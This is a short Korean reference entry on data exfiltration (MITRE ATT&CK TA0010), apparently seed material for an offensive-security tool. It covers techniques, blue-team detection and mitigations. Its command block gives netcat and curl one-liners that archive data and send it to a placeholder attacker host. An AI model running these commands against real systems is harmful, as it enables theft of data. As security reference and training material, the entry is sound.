# 학습 시드(심화): exfiltration

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn exfiltration`. P1: 머신별 라이트업 미참조.

## 개요
데이터 반출(TA0010): 수집 데이터 외부 전송.

## 핵심 기법 · 열거
- C2 채널·DNS/ICMP 터널·클라우드 업로드·압축/암호화 은닉

## 표준 도구 · 명령
```
# 수신: nc -lvnp 4444 > loot.tar.gz
tar czf - /data | nc <lhost> 4444
curl -F f=@loot.zip http://<lhost>/up
```

## 블루팀 탐지
비정상 대용량 아웃바운드·DNS 질의 급증·비승인 클라우드 업로드.

## 완화
DLP·egress 필터·아웃바운드 허용목록·비정상 전송 탐지.

- 출처(검증): https://attack.mitre.org/tactics/TA0010/

## 최신 보강(승격)

> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.

### ATT&CK TA0010 Exfiltration
- 출처: https://attack.mitre.org/tactics/TA0010/
- 승격일: 2026-10-07
- 요약: Exfiltration The adversary is trying to steal data. Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission. ID
